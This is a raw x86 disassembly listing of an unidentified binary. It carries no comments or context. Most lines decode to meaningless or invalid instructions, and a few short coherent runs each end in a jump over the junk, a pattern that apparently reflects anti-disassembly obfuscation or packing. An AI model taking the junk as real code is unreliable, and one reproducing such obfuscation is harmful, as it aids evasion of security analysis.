  402119:	jnp    0x4020d9
  40211b:	test   eax,0xc75f1131
  402120:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402122:	imul   eax,esi,0x38a50e58
  402128:	sahf   
  402129:	adc    dh,BYTE PTR [eax+0x69]
  40212c:	(bad)  
  40212d:	jns    0x40211d
  40212f:	sbb    esp,edx
  402131:	mov    esp,0xe7a6244c
  402136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402137:	enter  0xa030,0x8b
  40213b:	push   ebp
  40213c:	outs   dx,BYTE PTR ds:[esi]
  40213d:	push   0x1f
  40213f:	jge    0x402197
  402141:	mov    al,ds:0xe7d2c7e7
  402146:	inc    esp
  402147:	ins    BYTE PTR es:[edi],dx
  402148:	(bad)  
  402149:	xor    cl,ch
  40214b:	je     0x40210e
  40214d:	inc    edi
  40214e:	stc    
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	sbb    DWORD PTR [ebp+eiz*8+0x7e021e94],esp
  402170:	jle    0x40216c
  402172:	jg     0x4021f2
  402174:	jle    0x4021d3
  402176:	adc    eax,0x93dacc32
  40217b:	imul   edx,esi,0xffffffd4
  40217e:	std    
  40217f:	js     0x40216e
  402181:	xor    al,0x22
  402183:	push   cs
  402184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402185:	(bad)  
  402186:	pop    esi
  402187:	mov    esp,0xa00421c8
  40218c:	or     BYTE PTR [ebx],ch
  40218e:	das    
  40218f:	xor    al,dh
  402191:	sbb    eax,0x589ec433
  402196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402197:	shr    edi,cl
  402199:	pop    ecx
  40219a:	loop   0x40217f
  40219c:	push   ecx
  40219d:	mov    ds:0x85db5e39,eax
  4021a2:	in     eax,dx
  4021a3:	ror    BYTE PTR [edi+0x2f],0xed
  4021a7:	adc    bh,BYTE PTR [edi-0x5b]
  4021aa:	add    al,0x56
  4021ac:	(bad)  
  4021ad:	hlt    
  4021ae:	or     al,0x2c
  4021b0:	lock inc ebx
  4021b2:	retf   
  4021b3:	das    
  4021b4:	nop
  4021b5:	fdivr  st,st(2)
  4021b7:	fist   DWORD PTR [ebx]
  4021b9:	or     BYTE PTR [esi+0x31],bh
  4021bc:	ins    BYTE PTR es:[edi],dx
  4021bd:	lea    ecx,[ebp+0x24]
  4021c0:	es aad 0xfe
  4021c3:	test   al,dl
  4021c5:	push   ecx
  4021c6:	call   0x6dd1:0xfdc89410
  4021cd:	cld    
  4021ce:	cld    
  4021cf:	add    bh,BYTE PTR es:[eax+0x47079414]
  4021d6:	hlt    
  4021d7:	inc    ebp
  4021d8:	adc    esp,DWORD PTR [ecx+ebp*2+0x551e3dae]
  4021df:	add    BYTE PTR [eax+edx*2],0xc2
  4021e3:	movhps QWORD PTR [eax-0x1a],xmm3
  4021e7:	sub    esp,esp
  4021e9:	or     bh,BYTE PTR gs:[ecx]
  4021ec:	int3   
  4021ed:	mov    eax,ds:0xba3293e5
  4021f2:	loopne 0x402259
  4021f4:	dec    esp
  4021f5:	rol    DWORD PTR [ecx],cl
  4021f7:	cmc    
  4021f8:	mov    eax,0xc6d21858
  4021fd:	add    edi,ebx
  4021ff:	es aam 0x35
  402202:	ins    DWORD PTR es:[edi],dx
  402203:	jne    0x4021d2
  402205:	push   es
  402206:	aaa    
  402207:	mov    esp,0x44906b16
  40220c:	jp     0x40224e
  40220e:	rol    DWORD PTR [eax],0xe6
  402211:	fldcw  WORD PTR [ebx-0x4b6fa641]
  402217:	fcom   DWORD PTR [ecx+ebx*2+0x49df6673]
  40221e:	frstor [esi-0x55]
  402221:	xlat   BYTE PTR ds:[ebx]
  402222:	call   0xdf32:0x87a96a91
  402229:	aam    0x3d
  40222b:	in     eax,dx
  40222c:	scas   eax,DWORD PTR es:[edi]
  40222d:	sahf   
  40222e:	pop    ecx
  40222f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402230:	shl    BYTE PTR [eax+0x43],1
  402233:	sub    bh,BYTE PTR [eax+0x2a95f146]
  402239:	ss pushw cs
  40223c:	mov    esi,0x659a4ae
  402241:	cmp    eax,0x8d039a07
  402246:	popf   
  402247:	or     bh,bl
  402249:	les    ebx,FWORD PTR [edx-0x5c36691f]
  40224f:	lods   eax,DWORD PTR ds:[esi]
  402250:	inc    edx
  402251:	cmp    ch,al
  402253:	test   eax,0xa109427a
  402258:	or     eax,DWORD PTR [edi+eax*8+0x4baef783]
  40225f:	or     DWORD PTR [esi],0x7edad092
  402265:	pop    ebx
  402266:	iret   
  402267:	xchg   esi,eax
  402268:	xchg   esp,eax
  402269:	mov    WORD PTR [eax+ebx*4],fs
  40226c:	dec    edi
  40226d:	lds    ebx,FWORD PTR [eax]
  40226f:	shr    DWORD PTR [edi],1
  402271:	mov    ch,0xfb
  402273:	imul   esp,edi,0x55968480
  402279:	enter  0x1283,0xd7
  40227d:	cdq    
  40227e:	dec    ebp
  40227f:	jg     0x402283
  402281:	dec    esp
  402282:	xlat   BYTE PTR ds:[ebx]
  402283:	xchg   ecx,eax
  402284:	mov    ecx,0x3be7337c
  402289:	sbb    ebx,edi
  40228b:	mov    al,ds:0xf36a1115
  402290:	cmp    ebx,esp
  402292:	neg    dh
  402294:	fild   QWORD PTR [edi]
  402296:	je     0x40224b
  402298:	out    dx,eax
  402299:	aas    
  40229a:	stos   BYTE PTR es:[edi],al
  40229b:	imul   ebp,ebx,0x9bd738c7
  4022a1:	arpl   cx,sp
  4022a3:	add    bl,BYTE PTR [ebp+eiz*8+0x2e]
  4022a7:	inc    ecx
  4022a8:	mov    dl,0x13
  4022aa:	clc    
  4022ab:	ror    BYTE PTR [edx+0x1d0240b],cl
  4022b1:	rcr    ch,0x4d
  4022b4:	xchg   ebp,eax
  4022b5:	pop    es
  4022b6:	push   0x78f7bea4
  4022bb:	push   esi
  4022bc:	aaa    
  4022bd:	mov    edi,DWORD PTR [esi]
  4022bf:	jae    0x402337
  4022c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022c2:	lea    esp,[ecx-0x77]
  4022c5:	aaa    
  4022c6:	(bad)  
  4022c7:	lds    ebp,FWORD PTR [esi-0x33]
  4022ca:	push   cs
  4022cb:	pop    ebp
  4022cc:	jo     0x4022ea
  4022ce:	push   edx
  4022cf:	push   ss
  4022d0:	and    edx,DWORD PTR ds:0x6ebd9412
  4022d6:	mov    al,0x43
  4022d8:	dec    esp
  4022d9:	fidiv  WORD PTR [ecx-0x1f]
  4022dc:	hlt    
  4022dd:	lss    edi,FWORD PTR [edx+esi*1]
  4022e1:	jle    0x40235a
  4022e3:	pop    ebx
  4022e4:	add    ah,BYTE PTR [edx+eax*8+0x7a]
  4022e8:	rol    BYTE PTR [edi],1
  4022ea:	sbb    al,0x9b
  4022ec:	test   al,0x95
  4022ee:	cmc    
  4022ef:	add    BYTE PTR [ebx-0x62],dh
  4022f2:	xor    BYTE PTR [esi+0x18],0x1
  4022f6:	dec    ebx
  4022f7:	push   ds
  4022f8:	jmp    0x40234a
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	mov    al,ds:0x9afbb60f
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x4022f1
  402364:	or     DWORD PTR [eax+0x74],0x28e59246
  40236b:	outs   dx,BYTE PTR ds:[esi]
  40236c:	push   edx
  40236d:	mov    ebx,DWORD PTR [ecx]
  40236f:	loope  0x40237c
  402371:	pop    ebp
  402372:	test   eax,0xd59284a1
  402377:	push   edx
  402378:	ins    BYTE PTR es:[edi],dx
  402379:	inc    ebx
  40237a:	sbb    eax,0x87eec081
  40237f:	(bad)  
  402380:	push   edi
  402381:	hlt    
  402382:	scas   eax,DWORD PTR es:[edi]
  402383:	imul   ecx,DWORD PTR [edx],0x6e
  402386:	fmulp  st(6),st
  402388:	or     BYTE PTR [ebx],al
  40238a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40238b:	mov    bh,0x20
  40238d:	sub    edx,ebx
  40238f:	push   0xc1823a59
  402394:	fxtract 
  402396:	mov    ah,0x5f
  402398:	ins    DWORD PTR es:[edi],dx
  402399:	mov    ebp,0xe5c9a10a
  40239e:	mov    edi,DWORD PTR [esi]
  4023a0:	mov    esp,0x9715dffb
  4023a5:	into   
  4023a6:	adc    al,0x92
  4023a8:	xchg   esi,eax
  4023a9:	dec    ecx
  4023aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023ab:	add    al,0x40
  4023ad:	inc    ebp
  4023ae:	mov    edx,0xefb331e7
  4023b3:	sbb    al,0x4b
  4023b5:	es ja  0x402348
  4023b8:	out    0xee,al
  4023ba:	(bad)  
  4023bb:	dec    ebx
  4023bc:	xchg   esp,eax
  4023bd:	push   cs
  4023be:	or     eax,0x51c21225
  4023c3:	rcpps  xmm2,XMMWORD PTR [edx]
  4023c6:	fcomp  st(6)
  4023c8:	cli    
  4023c9:	inc    ebx
  4023ca:	dec    DWORD PTR [esi-0x42]
  4023cd:	fcomp  DWORD PTR [ebp-0x16]
  4023d0:	sbb    al,0xa9
  4023d2:	pushf  
  4023d3:	faddp  st(0),st
  4023d5:	ror    DWORD PTR [ebx+0x75],0xa8
  4023d9:	inc    esi
  4023da:	mov    es,WORD PTR [esi+0x6a]
  4023dd:	jmp    0xdc24cfa5
  4023e2:	das    
  4023e3:	xchg   edi,eax
  4023e4:	mov    BYTE PTR [edx],ah
  4023e6:	shl    BYTE PTR [esi-0x53e251fb],1
  4023ec:	xor    bl,bl
  4023ee:	jmp    0x8d43:0xd48de7da
  4023f5:	arpl   WORD PTR ds:0x289d3325,di
  4023fb:	add    al,0x29
  4023fd:	jecxz  0x402404
  4023ff:	adc    al,ch
  402401:	das    
  402402:	mov    ecx,0x86d9ab20
  402407:	in     eax,dx
  402408:	dec    bp
  40240a:	mov    ebp,0xc18546bc
  40240f:	or     BYTE PTR [edi-0x68814d43],dh
  402415:	loop   0x40248a
  402417:	push   ebx
  402418:	rcr    DWORD PTR [esi+0x7cade672],1
  40241e:	xor    DWORD PTR [eax+0x5e],eax
  402421:	cmp    eax,0x7f65ddd2
  402426:	mov    DWORD PTR [ecx-0x7160dd4],ebx
  40242c:	inc    ebx
  40242d:	sbb    al,0xc2
  40242f:	xchg   edx,eax
  402430:	inc    esi
  402431:	scas   eax,DWORD PTR es:[edi]
  402432:	out    0x94,eax
  402434:	cmp    eax,ebp
  402436:	jns    0x402457
  402438:	pop    es
  402439:	nop
  40243a:	imul   esi,esp,0xd5767fff
  402440:	pop    esp
  402441:	clc    
  402442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402443:	pop    ds
  402444:	das    
  402445:	test   DWORD PTR [ecx],edi
  402447:	aam    0x2e
  402449:	lahf   
  40244a:	sbb    eax,0xfc9316bb
  40244f:	js     0x40244e
  402451:	sub    DWORD PTR [edx+0x3664ff8a],0x20d94f3f
  40245b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40245c:	loop   0x4024b6
  40245e:	outs   dx,BYTE PTR ds:[esi]
  40245f:	jmp    0xac09d13a
  402464:	add    BYTE PTR [ebx+0x5d8c4b01],0xfe
  40246b:	popa   
  40246c:	cmp    al,0x8e
  40246e:	push   0x21
  402470:	sbb    eax,0x6d9d86e0
  402475:	data16 cmp BYTE PTR [esi],ch
  402478:	rol    DWORD PTR [ebx+0x494dfbe2],1
  40247e:	inc    ecx
  40247f:	cwde   
  402480:	and    al,dh
  402482:	jb     0x402405
  402484:	in     eax,dx
  402485:	es scas al,BYTE PTR es:[edi]
  402487:	(bad)  
  402488:	jle    0x402475
  40248a:	push   ecx
  40248b:	test   BYTE PTR [eax+eax*2-0x3cb0b4ea],ah
  402492:	mov    dl,0x7f
  402494:	inc    ebp
  402495:	push   ecx
  402496:	add    cl,0x67
  402499:	inc    ecx
  40249a:	dec    esi
  40249b:	add    al,0x62
  40249d:	retf   0x6072
  4024a0:	xor    BYTE PTR [edx],0x46
  4024a3:	mov    esp,ebx
  4024a5:	(bad)  
  4024a6:	repz inc ebx
  4024a8:	test   BYTE PTR [ecx+0x329e890e],bl
  4024ae:	pop    ecx
  4024af:	mov    eax,0xb2af1688
  4024b4:	fs jg  0x40252e
  4024b7:	nop
  4024b8:	sahf   
  4024b9:	ret    
  4024ba:	in     al,dx
  4024bb:	sti    
  4024bc:	adc    eax,0xabab0d83
  4024c1:	jb     0x402536
  4024c3:	cmp    DWORD PTR [edi+0x2f1aa19e],esp
  4024c9:	fwait
  4024ca:	ins    DWORD PTR es:[edi],dx
  4024cb:	mov    al,0x3f
  4024cd:	fwait
  4024ce:	ins    DWORD PTR es:[edi],dx
  4024cf:	outs   dx,DWORD PTR ds:[esi]
  4024d0:	push   eax
  4024d1:	or     DWORD PTR [ecx-0x17],ebp
  4024d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d5:	cmp    eax,0xeaef57a4
  4024da:	ins    BYTE PTR es:[edi],dx
  4024db:	push   edi
  4024dc:	sub    dh,dh
  4024de:	inc    esi
  4024df:	add    eax,0x1fff6dba
  4024e4:	stos   BYTE PTR es:[edi],al
  4024e5:	xor    eax,0xf0458b56
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	shl    BYTE PTR [eax+0x126c766],1
  402513:	jle    0x402593
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024a3
  40251a:	rcr    dl,0x63
  40251d:	inc    edi
  40251e:	adc    bh,BYTE PTR [ebp-0x40]
  402521:	jb     0x402533
  402523:	and    dl,al
  402525:	add    edi,esp
  402527:	push   edi
  402528:	lods   eax,DWORD PTR ds:[esi]
  402529:	xor    esi,DWORD PTR [ecx-0x6086b77b]
  40252f:	mov    fs,ebx
  402531:	clc    
  402532:	sub    edi,DWORD PTR [edi]
  402534:	fiadd  DWORD PTR [ebp-0x67258191]
  40253a:	sub    eax,0xce55003c
  40253f:	cwde   
  402540:	and    ch,ch
  402542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402543:	fs xchg esp,eax
  402545:	mov    ecx,0x5ed566fc
  40254a:	mov    dl,0xc2
  40254c:	cmp    ch,BYTE PTR [esi]
  40254e:	mov    ch,0x2
  402550:	loop   0x402504
  402552:	pop    ds
  402553:	mov    esi,0x12cbd0c5
  402558:	das    
  402559:	sub    eax,0xad1959eb
  40255e:	out    dx,al
  40255f:	add    edi,DWORD PTR [ebx-0x8]
  402562:	hlt    
  402563:	mov    ds:0x780d4f11,eax
  402568:	sbb    eax,edi
  40256a:	mov    dh,BYTE PTR [edx+ecx*8-0x6b76a]
  402571:	pop    esi
  402572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402573:	jg     0x402539
  402575:	mov    bh,0x33
  402577:	data16 fdiv DWORD PTR [ecx+ecx*2+0x3da28201]
  40257f:	daa    
  402580:	fnsave [ebp+edx*8+0x54]
  402584:	mov    edx,DWORD PTR ds:0x6673040e
  40258a:	dec    esp
  40258b:	and    al,0xa7
  40258d:	icebp  
  40258e:	pop    es
  40258f:	fs pop edx
  402591:	loop   0x4025e8
  402593:	inc    ecx
  402594:	dec    esi
  402595:	fs retf 
  402597:	push   0x22d80231
  40259c:	jne    0x4025d7
  40259e:	scas   al,BYTE PTR es:[edi]
  40259f:	leave  
  4025a0:	xor    al,0xfd
  4025a2:	rol    ch,1
  4025a4:	push   es
  4025a5:	xlat   BYTE PTR ds:[ebx]
  4025a6:	push   ecx
  4025a7:	add    DWORD PTR cs:[edi],0xffffffd6
  4025ab:	sub    eax,0x3b3d0fae
  4025b0:	mov    al,0xe6
  4025b2:	xchg   esi,eax
  4025b3:	or     BYTE PTR [ebp+0x53a7aa57],bh
  4025b9:	aaa    
  4025ba:	mov    al,0x9c
  4025bc:	dec    ebx
  4025bd:	xchg   DWORD PTR [ecx],ebp
  4025bf:	sbb    eax,0x2367780
  4025c4:	div    DWORD PTR [esi+0x2a]
  4025c7:	xchg   edi,eax
  4025c8:	stos   DWORD PTR es:[edi],eax
  4025c9:	fnsave [edx+ecx*4-0x49aff260]
  4025d0:	xor    DWORD PTR [esi],0xffffff97
  4025d3:	xchg   esi,eax
  4025d4:	mov    ebp,0xcbf16a83
  4025d9:	cmp    BYTE PTR [edx+edx*2+0x75],0x2a
  4025de:	fisubr DWORD PTR [edx+0x56]
  4025e1:	dec    esp
  4025e2:	and    DWORD PTR [ebp+0x56d6cef0],0xd4d0e9f6
  4025ec:	inc    ebx
  4025ed:	mov    esi,0x55434cd8
  4025f2:	mov    dl,0xa2
  4025f4:	add    al,BYTE PTR [esi+0x3bc50270]
  4025fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025fb:	sub    al,0x47
  4025fd:	jnp    0x40261a
  4025ff:	(bad)  
  402600:	cmp    edx,eax
  402602:	pop    ds
  402603:	jle    0x402655
  402605:	jmp    0x39b5b612
  40260a:	add    ecx,DWORD PTR [edx]
  40260c:	es ss into 
  40260f:	lock sub DWORD PTR [eax-0x315ab418],ebx
  402616:	mov    esi,0x39ed3856
  40261b:	ss cmp ebp,ecx
  40261e:	push   edx
  40261f:	mov    BYTE PTR [ebp+0x1d],dl
  402622:	mov    eax,ds:0x475e1358
  402627:	cdq    
  402628:	stos   BYTE PTR es:[edi],al
  402629:	outs   dx,DWORD PTR ds:[esi]
  40262a:	rol    DWORD PTR [esi],cl
  40262c:	xlat   BYTE PTR ds:[ebx]
  40262d:	scas   al,BYTE PTR es:[edi]
  40262e:	idiv   DWORD PTR [eax+ecx*8]
  402631:	jno    0x1b8fec44
  402637:	popf   
  402638:	test   al,0x81
  40263a:	fs sub eax,ebx
  40263d:	popf   
  40263e:	xchg   ecx,eax
  40263f:	pushf  
  402640:	fistp  DWORD PTR [esi]
  402642:	pop    eax
  402643:	lods   eax,DWORD PTR ds:[esi]
  402644:	cmp    eax,0x5b7375db
  402649:	lods   eax,DWORD PTR ds:[esi]
  40264a:	and    esp,DWORD PTR [ecx-0x5b68eb30]
  402650:	mov    DWORD PTR [esi+0x3d137600],eax
  402656:	jns    0x40262d
  402658:	bound  ebp,QWORD PTR [ecx]
  40265a:	out    dx,al
  40265b:	mov    es,WORD PTR [edx+0x35407c8b]
  402661:	inc    esp
  402662:	fucomp st(2)
  402664:	nop
  402665:	ins    BYTE PTR es:[edi],dx
  402666:	xor    BYTE PTR [ecx+ebx*4],dh
  402669:	xchg   ecx,eax
  40266a:	jle    0x4026e4
  40266c:	out    dx,eax
  40266d:	add    al,0x6f
  40266f:	mov    dl,0xcb
  402671:	dec    esi
  402672:	(bad)  
  402673:	mov    eax,0x7aae1e14
  402678:	cmp    dl,ch
  40267a:	out    dx,al
  40267b:	scas   eax,DWORD PTR es:[edi]
  40267c:	sbb    al,0xf
  40267e:	inc    ebp
  40267f:	and    al,0x2e
  402681:	ins    DWORD PTR es:[edi],dx
  402682:	sub    esp,DWORD PTR ds:0xea17abea
  402688:	jl     0x402640
  40268a:	push   ss
  40268b:	or     al,0x23
  40268d:	shl    BYTE PTR [edx+0x3],0x8b
  402691:	sbb    BYTE PTR [edi-0x59],bl
  402694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402695:	out    0xd7,al
  402697:	push   DWORD PTR [ebp-0x47]
  40269a:	sub    edi,DWORD PTR [eax+0x5c63377]
  4026a0:	fwait
  4026a1:	jb     0x4026d5
  4026a3:	add    BYTE PTR [ecx-0x23ba74ff],cl
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	mov    cl,0x67
  4026d4:	mul    BYTE PTR [edx-0x5e]
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x40272f
  4026df:	inc    edx
  4026e0:	sbb    DWORD PTR [edi+edx*4],ebp
  4026e3:	mov    ah,0x72
  4026e5:	inc    esi
  4026e6:	sar    BYTE PTR [edi+ecx*1],1
  4026e9:	test   DWORD PTR [eax+0x35246118],eax
  4026ef:	(bad)  
  4026f0:	jecxz  0x4026ee
  4026f2:	adc    BYTE PTR [ebx-0x7c5a946f],0xbc
  4026f9:	sar    BYTE PTR [edx+0x56],1
  4026fc:	in     eax,dx
  4026fd:	xchg   esi,eax
  4026fe:	mov    esi,0x6419c5c6
  402703:	ja     0x402773
  402705:	sbb    eax,0x11ae27c
  40270a:	mov    ds:0xf890eca5,eax
  40270f:	lds    ecx,FWORD PTR [edi-0x6a]
  402712:	sub    ah,al
  402714:	adc    al,0x1d
  402716:	add    eax,0x6626b8c7
  40271b:	mov    eax,ds:0x8d6296a
  402720:	xor    dh,dh
  402722:	xlat   BYTE PTR ds:[ebx]
  402723:	mov    eax,0x987ede32
  402728:	enter  0x3f18,0x12
  40272c:	clc    
  40272d:	out    0x4,eax
  40272f:	test   al,0xea
  402731:	fld1   
  402733:	(bad)  
  402734:	repnz enter 0x5cfd,0x3a
  402739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40273a:	jle    0x402723
  40273c:	(bad)  
  40273d:	mov    al,0x7f
  40273f:	lods   eax,DWORD PTR ds:[esi]
  402740:	(bad)  
  402741:	xor    al,0x6b
  402743:	jne    0x4027b7
  402745:	mov    bh,0xb0
  402747:	lock retf 0x2f8a
  40274b:	rcl    BYTE PTR [ebx-0x2f590570],1
  402751:	mov    esi,0x633f63b6
  402756:	cmp    al,0x6f
  402758:	xchg   ebp,eax
  402759:	xchg   ebp,eax
  40275a:	repnz fs sub eax,0x4176e03a
  402761:	fsubr  st,st(7)
  402763:	in     al,0x28
  402765:	loope  0x402773
  402767:	fisttp WORD PTR [edi]
  402769:	neg    DWORD PTR [edx]
  40276b:	shr    bl,1
  40276d:	inc    esi
  40276e:	imul   ebp,DWORD PTR [esi+0x8f4e7ff],0xffffffd3
  402775:	inc    edi
  402776:	das    
  402777:	cmp    al,0x7a
  402779:	sbb    eax,0xb368eaae
  40277e:	mov    al,ds:0x7f2546c0
  402783:	and    BYTE PTR ds:0x1bed038b,0x94
  40278a:	stos   BYTE PTR es:[edi],al
  40278b:	mov    dh,0x1f
  40278d:	rcr    ah,1
  40278f:	inc    eax
  402790:	stos   BYTE PTR es:[edi],al
  402791:	mov    edx,0x16046b6b
  402796:	imul   esi,DWORD PTR [edx+eiz*8+0xe],0xffffffdc
  40279b:	test   BYTE PTR [eax],ah
  40279d:	mov    ah,0xf3
  40279f:	in     eax,dx
  4027a0:	xor    edx,DWORD PTR [edi+0x476cc3c3]
  4027a6:	mov    al,0x80
  4027a8:	push   ss
  4027a9:	jo     0x4027a3
  4027ab:	cmp    DWORD PTR [edi*1+0x32077bae],edi
  4027b2:	ds sub eax,0xcc77193
  4027b8:	ret    0x7214
  4027bb:	adc    eax,0x9e279274
  4027c0:	or     al,0x2d
  4027c2:	adc    ebx,DWORD PTR [ecx-0x255af75b]
  4027c8:	or     DWORD PTR [edx],ebx
  4027ca:	sbb    eax,0x68d71f8f
  4027cf:	dec    ebp
  4027d0:	jno    0x402805
  4027d2:	mov    dl,dl
  4027d4:	add    dh,BYTE PTR [edx-0x6e0aa464]
  4027da:	xor    dh,BYTE PTR [edi+eiz*1-0x29ea3d00]
  4027e1:	jb     0x40280e
  4027e3:	clc    
  4027e4:	and    al,0x9a
  4027e6:	cmp    DWORD PTR [ecx],ebx
  4027e8:	xor    al,0xba
  4027ea:	call   ebp
  4027ec:	retf   
  4027ed:	jle    0x40284e
  4027ef:	or     ebx,ecx
  4027f1:	jne    0x40279a
  4027f3:	pushf  
  4027f4:	sub    BYTE PTR [edx],al
  4027f6:	adc    al,0xdf
  4027f8:	les    edx,FWORD PTR [ecx-0x61]
  4027fb:	(bad)  
  4027fc:	imul   eax,DWORD PTR [ecx-0x16],0x914a7e02
  402803:	rol    esi,cl
  402805:	popf   
  402806:	clc    
  402807:	add    DWORD PTR [edx+0x73],ebp
  40280a:	add    al,0x1d
  40280c:	pop    eax
  40280d:	pop    ds
  40280e:	loope  0x402879
  402810:	in     al,0xea
  402812:	cmp    al,0x87
  402814:	or     BYTE PTR [edi+0x69b0c4c2],dl
  40281a:	loopne 0x402866
  40281c:	out    dx,al
  40281d:	mov    dl,0xcb
  40281f:	dec    ebx
  402820:	adc    dh,BYTE PTR [edx+0x2e]
  402823:	jp     0x4027b3
  402825:	pushf  
  402826:	in     eax,dx
  402827:	push   ds
  402828:	mov    ebx,0xe0d97b48
  40282d:	ror    bl,1
  40282f:	sbb    eax,0xaac3bd83
  402834:	pop    ecx
  402835:	repnz int3 
  402837:	sbb    BYTE PTR [eax],al
  402839:	pushf  
  40283a:	push   esi
  40283b:	dec    eax
  40283c:	sub    BYTE PTR [ebx],ah
  40283e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283f:	rcl    cl,cl
  402841:	lds    esp,FWORD PTR ds:0x18ba2ffd
  402847:	xor    bl,BYTE PTR [ecx+0x6c2848f5]
  40284d:	(bad)  
  40284e:	xchg   ecx,eax
  40284f:	test   al,0x8e
  402851:	ficomp WORD PTR [edx+0x3c3df7a4]
  402857:	(bad)  
  402858:	lods   ax,WORD PTR ds:[esi]
  40285a:	inc    esp
  40285b:	clc    
  40285c:	sbb    al,0xad
  40285e:	daa    
  40285f:	test   eax,0x458b892e
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	retf   
  402884:	stos   BYTE PTR es:[edi],al
  402885:	icebp  
  402886:	push   es
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402858
  402890:	dec    edi
  402891:	loop   0x4028e1
  402893:	sti    
  402894:	ficom  DWORD PTR ds:0xe194c29e
  40289a:	sub    BYTE PTR [ebx+eiz*1],0xf5
  40289e:	mov    ebx,0x4e1ce601
  4028a3:	mov    ?,eax
  4028a5:	lahf   
  4028a6:	mov    cs,ecx
  4028a8:	pushf  
  4028a9:	xchg   bh,dl
  4028ab:	(bad)  
  4028ac:	loopne 0x402916
  4028ae:	adc    DWORD PTR [eax-0x73166854],edx
  4028b4:	push   0x5214669d
  4028b9:	fst    DWORD PTR [ebp-0x45e0c6fb]
  4028bf:	xor    BYTE PTR [edx-0x9e3c980],0xf9
  4028c6:	pop    esp
  4028c7:	mov    bh,BYTE PTR [eax*4-0x6c47ba38]
  4028ce:	rcr    BYTE PTR [ebx-0x6ec72a4e],0x39
  4028d5:	mov    al,0x46
  4028d7:	sbb    bh,cl
  4028d9:	cmp    eax,0xab3e01dd
  4028de:	ins    BYTE PTR es:[edi],dx
  4028df:	dec    esi
  4028e0:	xor    al,0x2d
  4028e2:	inc    edx
  4028e3:	pusha  
  4028e4:	ss and al,0x16
  4028e7:	pop    edi
  4028e8:	cmp    DWORD PTR [ebx+0x14],esp
